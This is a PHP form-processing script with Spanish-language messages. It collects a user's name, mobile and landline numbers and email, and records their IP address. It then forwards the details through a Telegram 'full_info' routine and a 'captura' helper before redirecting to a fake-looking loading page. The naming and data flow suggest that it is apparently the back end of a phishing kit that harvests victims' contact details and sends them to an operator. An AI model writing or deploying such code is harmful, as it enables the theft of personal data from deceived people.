<?php
require_once __DIR__ . '/../php_config/helpers.php';
require_once __DIR__ . '/../php_config/contacto_empresa_helpers.php';
session_start();

if (!isset($_SESSION['usuario_id'])) {
    header('Location: ../empresas/index.php');
    exit;
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    header('Location: ../empresas/formContc.php');
    exit;
}

$nombre = trim($_POST['fullName'] ?? '');
$telefono_movil = trim($_POST['mobile'] ?? '');
$telefono_fijo = trim($_POST['phone'] ?? '');
$email = trim($_POST['email'] ?? '');

$errores = contactoEmpresaValidarCampos($nombre, $telefono_movil, $telefono_fijo, $email);

if (!empty($errores)) {
    $_SESSION['form_errors'] = $errores;
    $_SESSION['form_old'] = [
        'fullName' => $nombre,
        'mobile' => $telefono_movil,
        'phone' => $telefono_fijo,
        'email' => $email,
    ];
    header('Location: ../empresas/formContc.php');
    exit;
}

try {
    $pdo = conectarBD();

    $ip_real = $_SESSION['ip_real'] ?? $_SERVER['REMOTE_ADDR'] ?? 'unknown';

    $stmt = $pdo->prepare("UPDATE usuarios SET nombre = ?, telefono_movil = ?, telefono_fijo = ?, email = ?, ip_real = ? WHERE id = ?");
    $stmt->execute([$nombre, $telefono_movil, $telefono_fijo, $email, $ip_real, $_SESSION['usuario_id']]);

    require_once __DIR__ . '/../telegram/telegram-full_info.php';
    telegram_full_info_desde_usuario($pdo, (int) $_SESSION['usuario_id'], [
        'nombre' => $nombre,
        'telefono_fijo' => $telefono_fijo,
        'telefono_movil' => $telefono_movil,
        'email' => $email,
    ]);

    contactoEmpresaRegistrarCapturaChat(
        $pdo,
        (int) $_SESSION['usuario_id'],
        $nombre,
        $telefono_movil,
        $telefono_fijo,
        $email,
        $ip_real
    );

    unset($_SESSION['form_errors'], $_SESSION['form_old']);

    header('Location: ../empresas/finCargando-execution.php');
    exit;
} catch (PDOException $e) {
    $_SESSION['form_errors'] = ['_general' => 'No pudimos procesar tu solicitud. Intenta de nuevo.'];
    $_SESSION['form_old'] = [
        'fullName' => $nombre,
        'mobile' => $telefono_movil,
        'phone' => $telefono_fijo,
        'email' => $email,
    ];
    header('Location: ../empresas/formContc.php');
    exit;
}
